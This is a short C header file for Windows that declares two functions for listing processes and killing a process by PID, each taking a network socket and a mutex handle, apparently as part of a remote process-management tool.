#ifndef TASKS_H
#define TASKS_H

#include <windows.h>
#include "utils.h"

void handle_tasklist(SOCKET sock, HANDLE mutex);
void handle_taskkill(SOCKET sock, HANDLE mutex, const char* pid_str);

#endif
